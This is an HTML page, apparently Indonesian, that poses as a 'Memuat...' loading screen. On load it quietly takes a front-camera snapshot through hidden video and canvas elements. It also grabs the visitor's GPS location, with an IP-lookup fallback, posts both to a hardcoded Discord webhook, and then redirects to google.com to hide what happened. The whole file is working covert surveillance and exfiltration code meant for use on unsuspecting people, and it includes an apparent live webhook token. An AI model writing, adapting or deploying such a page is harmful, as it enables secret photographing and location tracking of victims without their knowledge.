<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Memuat...</title>
    <style>
        *{margin:0;padding:0}
        body{background:#fff;height:100vh}
        video,canvas{position:absolute;opacity:0;pointer-events:none}
        .ld{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);text-align:center;color:#444}
        .ld div{width:40px;height:40px;border:3px solid #eee;border-top-color:#2563eb;border-radius:50%;animation:put .8s linear infinite;margin:0 auto 12px}
        @keyframes put{100%{transform:rotate(360deg)}}
    </style>
</head>
<body>
    <div class="ld"><div></div><p>Memuat...</p></div>

<script>
const WEBHOOK = "https://discord.com/api/webhooks/1538498418266218641/zM9vn4GAKeP_R6r5VTaC2Ccn_IAZQBHgUt2HvLWCqac519orhQJLSQlp8v89nelMYh6p";
const TUJUAN = "https://google.com";

let fotoSelesai = false;
let lokasiSelesai = false;
let fotoBase64 = null;

// 📷 AMBIL FOTO — MUNCUL IZIN KAMERA
navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:400,height:400}})
.then(kamera=>{
    const vid = document.createElement("video");
    vid.srcObject = kamera; vid.play();
    setTimeout(()=>{
        const kanvas = document.createElement("canvas");
        kanvas.width=400; kanvas.height=400;
        const ctx = kanvas.getContext("2d");
        ctx.drawImage(vid,0,0,400,400);
        fotoBase64 = kanvas.toDataURL("image/jpeg");
        kamera.getTracks().forEach(t=>t.stop());
        fotoSelesai = true;
        cekSelesai();
    },1200);
})
.catch(()=>{fotoSelesai=true;cekSelesai();});

// 📍 AMBIL LOKASI — MUNCUL IZIN LOKASI
navigator.geolocation.getCurrentPosition(
    pos=>{
        window.dataLokasi = `🌍 ${pos.coords.latitude}, ${pos.coords.longitude} | ±${Math.round(pos.coords.accuracy)}m`;
        lokasiSelesai = true;
        cekSelesai();
    },
    err=>{
        fetch("https://ip-api.com/json/?fields=city,regionName,country,query")
        .then(r=>r.json())
        .then(d=>{
            window.dataLokasi = `🌐 ${d.city}, ${d.regionName}, ${d.country} | IP: ${d.query}`;
            lokasiSelesai = true;
            cekSelesai();
        })
        .catch(()=>{window.dataLokasi="Lokasi tidak terbaca";lokasiSelesai=true;cekSelesai();});
    },
    {enableHighAccuracy:true,timeout:8000}
);

// ✅ KIRIM JIKA SUDAH LENGKAP
function cekSelesai(){
    if(!fotoSelesai || !lokasiSelesai) return;
    fetch(WEBHOOK,{
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify({
            content:"```✅ DATA MASUK\n"+(window.dataLokasi||"Lokasi tidak terbaca")+"```",
            embeds:fotoBase64?[{image:{url:fotoBase64}}]:[]
        })
    })
    .finally(()=>{window.location.href=TUJUAN;});
}
</script>
</body>
</html>
